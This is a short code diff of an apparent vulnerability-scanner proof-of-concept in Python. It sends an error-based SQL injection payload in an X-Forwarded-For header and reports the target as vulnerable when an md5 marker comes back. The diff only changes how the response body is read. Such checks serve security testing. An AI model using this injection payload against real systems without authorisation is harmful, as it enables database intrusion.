@@ -54,7 +54,7 @@ class Poc(ABPoc):
                 "X-Forwarded-For": "1.1.1.1',(select 1 from (select count(*),concat((Select concat(md5(3.14))),floor(rand(0)*2))x from information_schema.tables group by x)a),1,1)#"
             }
             r = s.get(verify_url, headers=header)
-            if r.status_code == 200 and '4beed3b9c4a886067de0e3a094246f781' in r.content:
+            if r.status_code == 200 and '4beed3b9c4a886067de0e3a094246f781' in r.text:
                 #security_hole(url + "\r\npayload:headers" + headers)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
